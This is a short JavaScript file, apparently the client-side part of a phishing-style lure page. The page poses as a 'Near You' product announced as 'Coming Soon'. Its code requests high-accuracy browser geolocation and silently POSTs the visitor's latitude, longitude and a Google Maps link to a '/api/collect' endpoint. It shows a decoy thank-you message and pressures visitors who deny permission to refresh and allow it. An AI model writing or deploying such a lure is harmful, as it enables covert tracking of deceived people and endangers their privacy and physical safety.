function locate()
{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('Geolocation is not Supported by your Browser...');
  }

  function showPosition(position)
  {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    $.ajax({
      type: 'POST',
      url: '/api/collect',
      contentType: 'application/json',
      data: JSON.stringify({
        template: 'nearyou',
        data: {
          latitude: lat,
          longitude: lon,
          map_url: `https://google.com/maps/place/${lat}+${lon}`
        }
      }),
      success: function(){$('#change').html('Coming Soon');},
    });
    alert('Thankyou For Taking Interest in Near You...This Product is Coming Soon...');
  };
}

function showError(error)
{
  var errorData = {};
	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			errorData.denied = 'User denied the request for Geolocation';
      alert('Please Refresh This Page and Allow Location Permission...');
      break;
		case error.POSITION_UNAVAILABLE:
			errorData.unavailable = 'Location information is unavailable';
			break;
		case error.TIMEOUT:
			errorData.timeout = 'The request to get user location timed out';
      alert('Please Set Your Location Mode on High Accuracy...');
			break;
		case error.UNKNOWN_ERROR:
			errorData.unknown = 'An unknown error occurred';
			break;
	}

  $.ajax({
    type: 'POST',
    url: '/api/collect',
    contentType: 'application/json',
    data: JSON.stringify({
      template: 'nearyou',
      data: {
        error: errorData
      }
    }),
    success: function(){$('#change').html('Failed');},
  });
}
